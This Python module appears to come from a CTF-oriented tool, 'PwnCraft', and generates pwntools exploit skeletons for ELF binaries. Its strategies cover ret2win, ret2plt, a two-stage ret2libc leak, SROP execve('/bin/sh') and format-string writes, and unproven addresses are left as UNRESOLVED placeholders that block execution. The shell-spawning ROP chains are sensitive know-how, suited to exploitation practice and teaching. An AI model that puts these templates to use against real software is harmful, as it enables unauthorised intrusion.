"""EXP skeleton renderer (VNext.6 renderer, minimal deterministic version).

诚实骨架原则：任何未经事实证明的值都以 ``0x0  # UNRESOLVED: …`` 出现并登记到
module 级 ``UNRESOLVED`` 列表，运行时先报错退出；生成的源码必须能通过
``features.audit.audit_exp`` 的确定性审计（往返自检见 roundtrip.py）。
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Mapping, Sequence

from .facts import TargetFacts
from .strategy import ExploitStrategy


@dataclass
class RenderedExp:
    source: str
    strategy: str
    constants: dict[str, str] = field(default_factory=dict)
    unresolved: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {"strategy": self.strategy, "constants": dict(self.constants),
                "unresolved": list(self.unresolved), "source": self.source}


def _address_expr(facts: TargetFacts, value: int) -> str:
    """非 PIE 直接字面量；PIE 用 BASE + offset（同文件静态地址即偏移）。"""
    if facts.is_pie():
        return f"BASE + 0x{value:x}"
    return f"0x{value:x}"


def _gadget(gadgets: Mapping[str, object] | None, *names: str) -> int | None:
    for name in names:
        raw = (gadgets or {}).get(name)
        if raw is None:
            continue
        try:
            return int(str(raw), 0)
        except (TypeError, ValueError):
            continue
    return None


def _header(facts: TargetFacts, strategy: ExploitStrategy, unresolved: Sequence[str]) -> list[str]:
    lines = [
        '"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。',
        "",
        f"strategy    : {strategy.id}（{strategy.name}）  status={strategy.status}",
        f"target      : {facts.path}  sha256={facts.sha256[:16]}…  "
        f"{facts.architecture}/{facts.bits}-bit  endian={facts.endian}",
        "mitigations : " + " ".join(
            f"{key}={facts.security.get(key, 'UNKNOWN')}"
            for key in ("PIE", "NX", "CANARY", "RELRO", "FORTIFY")),
        "provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）",
    ]
    if strategy.evidence:
        lines.append("evidence    :")
        lines.extend(f"  - {item}" for item in strategy.evidence[:8])
    if strategy.missing:
        lines.append("gaps        :")
        lines.extend(f"  - {item}" for item in strategy.missing)
    if unresolved:
        lines.append("unresolved  :")
        lines.extend(f"  - {item}" for item in unresolved)
    lines.append('"""')
    return lines


def _prelude(facts: TargetFacts, constants: Mapping[str, str]) -> list[str]:
    lines = ["from pwn import *", "",
             f'TARGET = {facts.path!r}',
             "context.binary = elf = ELF(TARGET, checksec=False)",
             'context.log_level = "info"', ""]
    if facts.is_pie():
        lines.append("BASE = 0x0            # UNRESOLVED: PIE 基址需先泄漏")
    for name, expression in constants.items():
        lines.append(f"{name} = {expression}")
    lines.append("")
    return lines


def _footer(unresolved: Sequence[str], body: Sequence[str]) -> list[str]:
    lines = [f"UNRESOLVED = {list(unresolved)!r}", "",
             "def exploit():",
             "    if UNRESOLVED:",
             '        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))',
             '    io = process(TARGET)']
    lines.extend(body)
    lines.extend(['    io.interactive()', '', '',
                  'if __name__ == "__main__":',
                  '    exploit()', ''])
    return lines


def render_exp(
    facts: TargetFacts,
    strategy: ExploitStrategy,
    *,
    libc_symbols: Mapping[str, int] | None = None,
    stack_truth: Mapping[str, object] | None = None,
    gadgets: Mapping[str, object] | None = None,
) -> RenderedExp:
    constants: dict[str, str] = {}
    unresolved: list[str] = []

    offset = None
    if isinstance(stack_truth, Mapping):
        raw = stack_truth.get("offset") or stack_truth.get("stack_offset")
        try:
            offset = int(str(raw), 0) if raw is not None else None
        except (TypeError, ValueError):
            offset = None
    if offset is None:
        constants["OFFSET"] = "0x0            # UNRESOLVED: cyclic / 调试器确认的填充长度"
        unresolved.append("OFFSET（到保存返回地址的填充长度）")
    else:
        constants["OFFSET"] = hex(offset)

    ret = facts.ret_gadget()
    if facts.bits == 64:
        if ret:
            constants["RET"] = _address_expr(facts, ret)
        else:
            constants["RET"] = "0x0            # UNRESOLVED: 裸 ret gadget（x86-64 栈对齐）"
            unresolved.append("RET（x86-64 对齐 gadget）")

    body: list[str] = []
    renderer = strategy.renderer or "generic"

    if renderer == "ret2win":
        win = facts.win_functions[0] if facts.win_functions else {}
        address = int(win.get("function_address") or 0)
        if address:
            constants["WIN"] = _address_expr(facts, address)
        else:
            constants["WIN"] = "0x0            # UNRESOLVED: 程序内调用点地址"
            unresolved.append("WIN（程序内调用点地址）")
        body.append(f'    payload = flat({{OFFSET: [p64(RET), p64(WIN)]}})'
                    if facts.bits == 64 else f'    payload = flat({{OFFSET: [p32(WIN)]}})')
        body.append("    io.sendline(payload)")

    elif renderer == "ret2plt":
        system = facts.plt["system"].address
        constants["SYSTEM_PLT"] = _address_expr(facts, system)
        shell = next((address for text, address in facts.strings.items()
                      if text in ("/bin/sh", "/bin/bash", "/bin/cat")), 0)
        if shell:
            constants["BINSH"] = _address_expr(facts, shell)
        else:
            constants["BINSH"] = "0x0            # UNRESOLVED: 壳字符串地址"
            unresolved.append("BINSH（壳字符串地址）")
        if facts.bits == 64:
            rdi = _gadget(gadgets, "rdi", "pop_rdi")
            if rdi:
                constants["POP_RDI"] = _address_expr(facts, rdi)
            else:
                constants["POP_RDI"] = "0x0            # UNRESOLVED: pop rdi; ret gadget"
                unresolved.append("POP_RDI（gadget shelf 未证明）")
            chain = "[p64(RET), p64(POP_RDI), p64(BINSH), p64(SYSTEM_PLT)]"
        else:
            chain = "[p32(SYSTEM_PLT), p32(0xdeadbeef), p32(BINSH)]"
        body.append(f"    payload = flat({{OFFSET: {chain}}})")
        body.append("    io.sendline(payload)")

    elif renderer == "ret2libc":
        libc = dict(libc_symbols or {})
        puts_offset = libc.get("puts")
        if puts_offset is None:
            constants["PUTS_LIBC"] = "0x0            # UNRESOLVED: libc puts 偏移"
            unresolved.append("PUTS_LIBC（libc puts 偏移）")
        else:
            constants["PUTS_LIBC"] = hex(puts_offset)
        got_name = "puts" if "puts" in facts.got else next(iter(facts.got), "")
        if got_name:
            constants["PUTS_GOT"] = _address_expr(facts, facts.got[got_name].address)
        else:
            constants["PUTS_GOT"] = "0x0            # UNRESOLVED: 泄漏目标 GOT 槽"
            unresolved.append("PUTS_GOT（泄漏目标 GOT 槽）")
        if "system" in libc:
            constants["SYSTEM_LIBC"] = hex(libc["system"])
        else:
            constants["SYSTEM_LIBC"] = "0x0            # UNRESOLVED: libc system 偏移"
            unresolved.append("SYSTEM_LIBC（libc system 偏移）")
        if "str_bin_sh" in libc:
            constants["BINSH_LIBC"] = hex(libc["str_bin_sh"])
        else:
            constants["BINSH_LIBC"] = "0x0            # UNRESOLVED: libc /bin/sh 偏移"
            unresolved.append("BINSH_LIBC（libc /bin/sh 偏移）")
        rdi = _gadget(gadgets, "rdi", "pop_rdi")
        constants["POP_RDI"] = _address_expr(facts, rdi) if rdi else \
            "0x0            # UNRESOLVED: pop rdi; ret gadget"
        if not rdi:
            unresolved.append("POP_RDI（gadget shelf 未证明）")
        body.extend([
            "    # 阶段 1：泄漏 libc 基址",
            "    io.recvuntil(b'')  # TODO: 对齐真实回显",
            "    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
            "    libc_base = leak - PUTS_LIBC",
            "    log.success(f'libc base = {libc_base:#x}')",
            "",
            "    # 阶段 2：函数指针替换为 system('/bin/sh')",
            "    io.sendline(b'')  # TODO: 重新进入输入点",
            f"    payload = flat({{OFFSET: [p64(RET), p64(POP_RDI), p64(libc_base + BINSH_LIBC),"
            " p64(libc_base + SYSTEM_LIBC)]})",
            "    io.sendline(payload)",
        ])

    elif renderer == "srop":
        syscall = facts.syscalls[0] if facts.syscalls else 0
        if syscall:
            constants["SYSCALL"] = _address_expr(facts, syscall)
        else:
            constants["SYSCALL"] = "0x0            # UNRESOLVED: syscall; ret 地址"
            unresolved.append("SYSCALL（syscall 站点地址）")
        rax = _gadget(gadgets, "rax", "pop_rax")
        if rax:
            constants["POP_RAX"] = _address_expr(facts, rax)
        else:
            constants["POP_RAX"] = "0x0            # UNRESOLVED: pop rax; ret gadget"
            unresolved.append("POP_RAX（sigreturn 号需要）")
        shell = next((address for text, address in facts.strings.items()
                      if text in ("/bin/sh", "/bin/bash")), 0)
        constants["BINSH"] = _address_expr(facts, shell) if shell else "0x0"
        if not shell:
            unresolved.append("BINSH（壳字符串地址）")
        body.extend([
            "    frame = SigreturnFrame()",
            "    frame.rax = constants.SYS_execve",
            "    frame.rdi = BINSH",
            "    frame.rsi = 0",
            "    frame.rdx = 0",
            "    frame.rip = SYSCALL",
            f"    payload = flat({{OFFSET: [p64(POP_RAX), p64(15), p64(SYSCALL), bytes(frame)]}})",
            "    io.sendline(payload)",
        ])

    elif renderer == "orw":
        syscall = facts.syscalls[0] if facts.syscalls else 0
        constants["SYSCALL"] = _address_expr(facts, syscall) if syscall else \
            "0x0            # UNRESOLVED: syscall; ret 地址"
        if not syscall:
            unresolved.append("SYSCALL（syscall 站点地址）")
        for name in ("open", "read", "write"):
            if name in facts.plt:
                constants[f"{name.upper()}_PLT"] = _address_expr(facts, facts.plt[name].address)
            else:
                constants[f"{name.upper()}_PLT"] = f"0x0            # UNRESOLVED: {name}@plt"
                unresolved.append(f"{name.upper()}_PLT（{name}@plt 缺失）")
        body.extend([
            "    # seccomp 白名单场景：open('/flag') → read → write(1)",
            "    # 步骤（顺序不可换）：",
            "    #   1) open(FLAG, O_RDONLY)",
            "    #   2) read(fd, BUF, 0x100)",
            "    #   3) write(1, BUF, 0x100)",
            "    # TODO: 按 ABI 布置 rdi/rsi/rdx 并串联三个 syscall",
            "    payload = b''  # UNRESOLVED: ORW 链未渲染（缺少寄存器控制 gadget 证明）",
            "    io.sendline(payload)",
        ])

    elif renderer == "fmt":
        constants["FMT_OFFSET"] = "0x0            # UNRESOLVED: 格式串参数偏移（%p 探针测）"
        constants["TARGET_ADDR"] = "0x0            # UNRESOLVED: 写入目标地址（如 GOT 槽）"
        constants["TARGET_VALUE"] = "0x0            # UNRESOLVED: 目标值"
        unresolved.extend(["FMT_OFFSET", "TARGET_ADDR", "TARGET_VALUE"])
        body.extend([
            "    payload = fmtstr_payload(FMT_OFFSET, {TARGET_ADDR: TARGET_VALUE})",
            "    io.sendline(payload)",
        ])

    else:  # heap / generic：只交计划，不假装可运行
        body.append("    raise SystemExit('该策略尚未接入渲染器（plan-only）；"
                    "请按策略步骤在 heapviz 中推演')")
        unresolved.append("渲染器未实现（plan-only）")

    lines = _header(facts, strategy, unresolved) + _prelude(facts, constants) + \
        _footer(unresolved, body)
    return RenderedExp(source="\n".join(lines), strategy=strategy.id,
                       constants=constants, unresolved=unresolved)
